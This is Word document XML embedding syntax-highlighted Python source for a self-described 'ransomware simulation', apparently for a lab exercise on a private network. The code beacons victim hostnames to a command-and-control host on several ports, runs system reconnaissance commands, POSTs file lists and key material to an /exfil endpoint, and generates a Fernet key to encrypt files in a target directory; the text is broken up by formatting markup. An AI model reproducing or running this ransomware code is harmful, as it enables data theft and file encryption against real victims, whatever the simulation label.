      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>(message, level=</w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="6AAB73"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>"INFO"</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try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sock = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>socket.socket</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socket.AF_INET</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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socket.SOCK_STREAM</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sock.settimeout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3</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sock.connect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'192.168.100.20'</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2AACB8"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>6050</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log_data</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> = {</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"timestamp"</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datetime.now</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isoformat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"level"</w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>: level,</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attack_id</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"hostname"</w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>: hostname,</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"username"</w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>: username,</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"message"</w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>: message,</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"source"</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ransomware_simulation</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6AAB73"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        </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sock.send</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json.dumps</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log_data</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve">) + </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).encode())</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sock.close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message[:</w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="2AACB8"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>70</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lastRenderedPageBreak/>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CF8E6D"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>return True</w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CF8E6D"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    except </w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="8888C6"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve">Exception </w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CF8E6D"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve">as </w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>e:</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Log failed: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e</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return False</w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CF8E6D"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CF8E6D"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">def </w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="56A8F5"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>connect_to_c2</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C2 CONNECTION PHASE"</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"C2_BEACON | Contacting command server"</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"CRITICAL"</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c2_targets = [</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'192.168.100.20'</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2AACB8"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>31337</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'192.168.100.20'</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2AACB8"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>8888</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for </w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve">c2_host, c2_port </w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CF8E6D"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve">in </w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>c2_targets:</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try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sock = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>socket.socket</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socket.AF_INET</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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socket.SOCK_STREAM</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sock.settimeout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10</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sock.connect</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>((c2_host, c2_port))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beacon = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>json.dumps</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victim_id</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'hostname'</w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>: hostname,</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'timestamp'</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attack_timestamp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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sock.send</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beacon.encode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sock.close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 xml:space="preserve">f"C2_CONNECTED |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c2_host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c2_port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"CRITICAL"</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time.sleep</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1</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except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 xml:space="preserve">f"C2_ATTEMPT |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c2_host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c2_port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unreachable"</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def </w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="56A8F5"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>reconnaissance</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RECONNAISSANCE PHASE"</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"RECON_START | System enumeration"</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commands = [</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whoami</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"User identity"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'id'</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"Privileges check"</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uname</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'-a'</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"System info"</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'ls'</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'-la'</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'/home/kali'</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"Home directory"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ps</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'aux'</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"Process list"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for </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>cmd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve">, desc </w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CF8E6D"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve">in </w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>commands:</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try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subprocess.run</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cmd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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AA4926"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>capture_output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CF8E6D"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>True</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AA4926"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>timeout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2</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f"RECON_CMD</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>.join(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>cmd</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desc</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time.sleep</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0.5</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except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pass</w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CF8E6D"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CF8E6D"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CF8E6D"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">def </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="56A8F5"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>exfiltrate_data</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key_preview</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EXFILTRATION PHASE"</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f"EXFIL_START</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="6AAB73"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> | Files=</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"CRITICAL"</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try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exfil_data</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json.dumps</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'victim'</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'files'</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key_sample</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key_preview</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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sock = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>socket.socket</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socket.AF_INET</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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socket.SOCK_STREAM</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sock.settimeout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2</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sock.connect</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'192.168.100.20'</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2AACB8"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>8080</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http_req</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6AAB73"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>f"POST</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="6AAB73"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> /exfil HTTP/1.1</w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CF8E6D"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>\r\</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>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Host</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="6AAB73"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>: 192.168.100.20</w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CF8E6D"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>\r\n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6AAB73"/>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http_req</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6AAB73"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>f"Content</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="6AAB73"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve">-Length: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8888C6"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>len</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exfil_data</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CF8E6D"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>}\r\n\r\n{</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>exfil_data</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6AAB73"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="6AAB73"/>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sock.send</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http_req.encode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sock.close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f"EXFIL_SUCCESS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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8888C6"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>len</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exfil_data</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bytes sent"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"CRITICAL"</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except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"EXFIL_BLOCKED | Connection failed"</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70</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RANSOMWARE SIMULATION - ATTACK ID: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70</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reconnaissance()</w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>time.sleep</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2</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connect_to_c2()</w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>time.sleep</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2</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ENCRYPTION PHASE"</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f"ATTACK_START</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="6AAB73"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> | HOST=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hostname</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 USER=</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username</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 TARGET=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target</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key = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>Fernet.generate_key</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cipher = Fernet(key)</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try</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key_path</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os.path.join</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve">(target,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decrypt_key.key</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with </w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="8888C6"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>open</w:t>
      </w:r>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key_path</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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wb</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CF8E6D"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve">as </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>key_file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key_file.write</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>(key)</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f"KEY_GENERATED</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="6AAB73"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> | Stored at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key_path</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"INFO"</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BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> = </w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="2AACB8"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="2AACB8"/>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files_in_dir</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="BCBEC4"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> = [f </w:t>
      </w:r>
      <w:r w:rsidRPr="00177E05">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CF8E6D"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve">for </w:t>
      </w:r>
